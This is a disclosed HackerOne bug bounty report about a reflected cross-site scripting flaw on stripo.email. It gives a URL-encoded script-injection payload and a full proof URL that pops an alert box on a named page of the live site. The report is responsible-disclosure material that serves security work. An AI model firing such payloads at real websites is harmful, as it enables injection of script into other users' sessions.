# stripo.email reflected xss

## Report Details
- **Report ID**: 714521
- **URL**: https://hackerone.com/reports/714521
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-15T13:37:08.301Z
- **Disclosed**: 2019-12-26T13:31:04.830Z

## Reporter
- **Username**: trazer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
hello securitty team tested windows 10 and firefox 69.0.3 (64 bit)

test url: <https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry >

payload: %3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E

Proof Url : 
```
https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry%3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E
```
Proof Url open firefox 

{F608355}

## Impact

https://www.owasp.org/index.php?title=Reflected_XSS

## Attachments
- 2019-10-15_16-34-21.png
